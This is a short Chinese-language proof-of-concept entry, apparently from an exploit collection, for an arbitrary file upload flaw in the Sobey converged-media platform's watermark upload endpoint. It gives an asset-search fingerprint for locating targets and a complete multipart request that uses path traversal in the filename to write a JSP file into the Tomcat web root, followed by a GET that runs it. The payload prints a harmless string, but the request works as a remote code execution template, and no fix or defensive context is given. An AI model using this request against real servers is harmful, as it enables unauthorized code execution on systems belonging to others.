# 索贝融媒体Upload存在任意文件上传导致RCE漏洞

- **系统**：索贝融媒体　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="SOBEY-融媒体"`
- **请求**：`POST /sobey-mchEditor/watermark/upload HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary89I920XG…`

**请求体 / payload**
```
------WebKitFormBoundary89I920XG9PT7qiwi
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/upload.jsp"
Content-Type: image/jpeg
<% out.print("Hello World!"); %>
------WebKitFormBoundary89I920XG9PT7qiwi--
GET /sobey-mchEditor/upload.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—